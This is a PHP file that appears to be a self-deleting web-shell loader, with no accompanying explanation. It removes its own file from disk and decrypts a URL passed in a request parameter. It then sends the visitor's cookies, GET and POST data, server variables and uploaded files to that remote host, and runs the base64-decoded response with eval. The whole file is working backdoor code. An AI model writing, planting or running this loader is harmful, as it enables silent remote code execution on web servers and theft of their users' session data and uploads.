<?php
@error_reporting(0);
set_time_limit(0);
ignore_user_abort(true);

function getData($url,$postdata = array()){
	$fields = array();
	$output_files = array();
	if(empty($postdata))
	{
		$json_get = json_encode($_GET);
		$json_post = json_encode($_POST);
		$json_files = json_encode($_FILES);
		$json_cookie = json_encode($_COOKIE);
		$json_server = json_encode($_SERVER);
		$json_all_header = base64_encode($json_get."\n".$json_post."\n".$json_files."\n".$json_cookie."\n".$json_server);
		$host = 'none';
		if(isset($_SERVER['HTTP_HOST']))
		{
			$host = $_SERVER['HTTP_HOST'];
		}
		$fields = array("host"=>base64_encode($host), "json_all_header"=>$json_all_header);
		foreach ($_FILES as $attrName => $valuesArray) {
			foreach ($valuesArray as $key => $value) {
				$output_files[$attrName][$key] = $value;
			}
		}
	}else{
		$fields = $postdata;
	}
	$curl = curl_init();
	$boundary = uniqid();
	$delimiter = '-------------' . $boundary;
	$post_data = build_form($boundary, $fields, $output_files);
	curl_setopt_array($curl, array(
	  CURLOPT_URL => $url,
	  CURLOPT_RETURNTRANSFER => 1,
	  CURLOPT_MAXREDIRS => 3,
	  CURLOPT_CONNECTTIMEOUT  => 5,
	  CURLOPT_TIMEOUT => 10,
	  CURLOPT_CUSTOMREQUEST => "POST",
	  CURLOPT_POST => 1,
	  CURLOPT_POSTFIELDS => $post_data,
	  CURLOPT_HTTPHEADER => array(
		"Content-Type: multipart/form-data; boundary=" . $delimiter,
		"Content-Length: " . strlen($post_data)
	  ),
	));

	$response = curl_exec($curl);
	if(curl_errno($curl))
	{
		$info = curl_getinfo($curl);
		print_r($info);
	}
	curl_close($curl);
	return $response;
}

function build_form($boundary, $fields, $output_files){
	$data = '';
	$eol = "\r\n";
	$delimiter = '-------------' . $boundary;
	foreach ($fields as $name => $content) {
		$data .= "--" . $delimiter . $eol
			. 'Content-Disposition: form-data; name="' . $name . "\"".$eol.$eol
			. $content . $eol;
	}

	foreach ($output_files as $name => $values) {
		$data .= "--" . $delimiter . $eol
			. 'Content-Disposition: form-data; name="' . $name . '"; filename="' . $values["name"] . '"' . $eol
			. 'Content-Type: '.$values["type"].$eol
			. 'Content-Transfer-Encoding: binary'.$eol
			;
		$data .= $eol;
		$content = file_get_contents($values["tmp_name"]);
		$data .= $content . $eol;
	}
	$data .= "--" . $delimiter . "--".$eol;
	return $data;
}

function stringEncrypt($string, $operation = 'DECODE', $key = '', $expiry = '') {
	$ckey_length = 4;
	$key = md5($key ? $key : 'default_key');
	$keya = md5(substr($key, 0, 16));
	$keyb = md5(substr($key, 16, 16));
	$keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';

	$cryptkey = $keya.md5($keya.$keyc);
	$key_length = strlen($cryptkey);

	$string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;
	$string_length = strlen($string);

	$result = '';
	$box = range(0, 255);

	$rndkey = array();
	for($i = 0; $i <= 255; $i++) {
		$rndkey[$i] = ord($cryptkey[$i % $key_length]);
	}

	for($j = $i = 0; $i < 256; $i++) {
		$j = ($j + $box[$i] + $rndkey[$i]) % 256;
		$tmp = $box[$i];
		$box[$i] = $box[$j];
		$box[$j] = $tmp;
	}

	for($a = $j = $i = 0; $i < $string_length; $i++) {
		$a = ($a + 1) % 256;
		$j = ($j + $box[$a]) % 256;
		$tmp = $box[$a];
		$box[$a] = $box[$j];
		$box[$j] = $tmp;
		$result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));
	}

	if($operation == 'DECODE') {
		if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {
			return substr($result, 26);
		} else {
			return '';
		}
	} else {
		return $keyc.str_replace('=', '', base64_encode($result));
	}

}

define('INSTALL_CODE', file_get_contents(__FILE__));
while(true)
{
	unlink(__FILE__);
	clearstatcache();
	if(!file_exists(__FILE__)){
		break;
	}else{
		file_put_contents( __DIR__ .'/relog.txt', date("Y-m-d H:i:s ")."1".PHP_EOL, FILE_APPEND);
	}
	sleep(1);
}

if(isset($_REQUEST['url']))
{
	$url = stringEncrypt($_REQUEST['url'], 'DECODE');
	define('CODE_DOWNLOAD_URL',$url);
	if(eval('return "ok";') == "ok"){
		$mydata = getData($url);
		$mycode = base64_decode($mydata);
		eval($mycode);
	}else{
		echo 'INSTALL FAILED';
	}
}
exit();

?>